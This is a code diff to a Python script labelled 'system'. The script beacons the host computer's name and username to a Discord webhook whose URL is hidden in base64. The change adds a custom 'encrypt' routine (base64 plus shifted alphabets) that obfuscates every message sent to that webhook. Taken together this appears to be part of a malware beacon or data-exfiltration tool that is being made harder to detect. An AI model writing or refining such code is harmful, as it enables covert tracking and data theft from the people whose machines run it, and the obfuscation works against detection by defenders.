@@ -1,3 +1,4 @@
+import string
 import base64
 import json
 import os
@@ -10,18 +11,34 @@ WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2MTM2NTkwMjUzOTg4N
 
 def format_start_data(computer_name,user_name):
     data = {'info':'script_started','script':'system','computer':computer_name,'username':user_name}
-    return f"||{json.dumps(data)}||"
+    return f"{json.dumps(data)}"
 
 def format_alive_data(computer_name,user_name):
     data = {'info':'alive','script':'system','computer':computer_name,'username':user_name}
-    return f"||{json.dumps(data)}||"
+    return f"{json.dumps(data)}"
 
+def encrypt(text: str) -> str:
+    # Base64 encode
+    b64 = base64.b64encode(text.encode()).decode()
+
+    lower = string.ascii_lowercase
+    upper = string.ascii_uppercase
+
+    lower_rot = lower[5:] + lower[:5]      # +5 rotation
+    upper_rot = upper[-3:] + upper[:-3]    # -3 rotation
+
+    table = str.maketrans(
+        lower + upper,
+        lower_rot + upper_rot
+    )
+
+    return b64.translate(table)
 
 def send_webhook(message):
     webhook_url = base64.b64decode(WEBHOOK_B64).decode("utf-8")
 
     payload = json.dumps({
-        "content": message
+        "content": encrypt(message)
     }).encode("utf-8")
 
     req = urllib.request.Request(
